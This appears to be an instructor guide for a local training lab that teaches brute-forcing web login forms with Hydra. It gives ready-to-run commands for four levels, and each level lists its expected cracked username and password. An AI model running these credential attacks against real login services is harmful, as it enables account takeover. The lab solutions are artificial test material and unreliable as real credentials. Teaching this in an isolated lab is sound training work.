# CyberKata Hydra Dojo — Instructor Guide

These commands are for the deliberately vulnerable local lab only. Run them from
the `cyberkata-hydra-lab` directory while `server.py` is running.

## Command structure

Hydra needs four pieces of information:

1. Credentials to test
2. The authorised target and port
3. The service or request module
4. A response condition that identifies failure or success

The form body used by every level is:

```text
username=^USER^&password=^PASS^
```

Hydra replaces `^USER^` and `^PASS^` on every attempt.

## Level 1 — Password Hunt

Known username, password list:

```bash
hydra -l kata -P wordlists/passwords.txt 127.0.0.1 -s 8080 \
  http-post-form "/api/login/1:username=^USER^&password=^PASS^:F=ACCESS_DENIED" \
  -t 4 -f -V
```

Expected result:

```text
login: kata   password: neonpulse
```

## Level 2 — Find the User

Username list, known password:

```bash
hydra -L wordlists/usernames.txt -p dojo-pass 127.0.0.1 -s 8080 \
  http-post-form "/api/login/2:username=^USER^&password=^PASS^:F=UNKNOWN_OPERATOR" \
  -t 4 -f -V
```

Expected result:

```text
login: operator   password: dojo-pass
```

## Level 3 — Credential Storm

Username and password lists:

```bash
hydra -L wordlists/usernames.txt -P wordlists/passwords.txt 127.0.0.1 -s 8080 \
  http-post-form "/api/login/3:username=^USER^&password=^PASS^:F=INVALID_CREDENTIAL_PAIR" \
  -t 4 -f -V
```

Expected result:

```text
login: admin   password: nightshift42
```

## Level 4 — Read the Response

Failures return `200 OK` with no success marker. Valid credentials return a `302`
redirect, and the destination contains `HYDRA_DOJO_COMPLETE`.

```bash
hydra -L wordlists/usernames.txt -P wordlists/passwords.txt 127.0.0.1 -s 8080 \
  http-post-form "/api/login/4:username=^USER^&password=^PASS^:S=HYDRA_DOJO_COMPLETE" \
  -t 4 -f -V
```

Expected result:

```text
login: analyst   password: response302
```

## Optional combo-list demonstration

Hydra's `-C` option accepts `username:password` pairs. It is useful when you want
to test known pairs without generating every possible combination:

```bash
hydra -C wordlists/credential-pairs.txt 127.0.0.1 -s 8080 \
  http-post-form "/api/login/3:username=^USER^&password=^PASS^:F=INVALID_CREDENTIAL_PAIR" \
  -t 4 -f -V
```

## Recording notes

- Use `-V` when demonstrating individual attempts on screen.
- Remove `-V` when showing a cleaner real-world run.
- Explain that `-t 4` controls parallel tasks; a larger number is not always
  faster or more reliable.
- Keep `F=` or `S=` as the final condition in the form module string.
- When using VM mode, replace `127.0.0.1` with the printed VM target address.
